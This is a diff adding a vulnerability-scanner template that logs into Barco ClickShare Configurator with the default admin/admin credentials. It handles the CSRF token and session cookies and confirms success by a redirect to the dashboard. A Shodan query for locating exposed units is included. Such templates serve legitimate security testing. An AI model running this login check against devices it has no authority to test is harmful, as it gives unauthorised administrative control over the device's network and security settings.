@@ -1,0 +1,75 @@
+id: barco-clickshare-configurator-default-login
+
+info:
+  name: Barco ClickShare Configurator - Default Login
+  author: mr-pmillz
+  severity: high
+  description: |
+    Barco ClickShare Configurator accepts the default admin/admin credentials when its administrator password has not been changed.
+  impact: |
+    An attacker can access the ClickShare configuration interface and modify device, network, and security settings.
+  remediation: |
+    Change the ClickShare Configurator administrator password and restrict access to the configuration interface to trusted networks.
+  reference:
+    - https://www.barco.com/en/support/knowledge-base/4292-clickshare-base-unit-wifi-and-web-configurator-password
+  classification:
+    cwe-id: CWE-1392
+  metadata:
+    vendor: barco
+    product: clickshare
+    shodan-query: '"ClickShareSession"'
+  tags: default-login,barco,clickshare,intrusive
+
+flow: http(1) && http(2)
+
+variables:
+  username: admin
+  password: admin
+
+http:
+  - raw:
+      - |
+        GET /login HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: csrf_token
+        group: 1
+        part: body
+        internal: true
+        regex:
+          - '<input\stype="hidden"\sid="csrf_token"\sname="csrf_protection_token"\svalue="([[:alnum:]]{32})" />'
+
+      - type: kval
+        name: csrf_cookie
+        internal: true
+        part: header
+        kval:
+          - csrf_cookie
+      - type: kval
+        name: csession
+        internal: true
+        part: header
+        kval:
+          - ClickShareSession
+
+  - raw:
+      - |
+        POST /login/log_me_in HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: csrf_cookie={{csrf_token}}; ClickShareSession={{csession}};
+        Content-Type: application/x-www-form-urlencoded
+        Referer: https://{{Hostname}}/login
+
+        csrf_protection_token={{csrf_token}}&username={{url_encode(username)}}&password={{url_encode(password)}}&eula_accepted=true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 303
+      - type: regex
+        part: header
+        regex:
+          - "Location:\\s(http|https):\\/\\/([a-zA-Z0-9.-]+|(\\d{1,3}\\.){3}\\d{1,3})\\/dashboard"
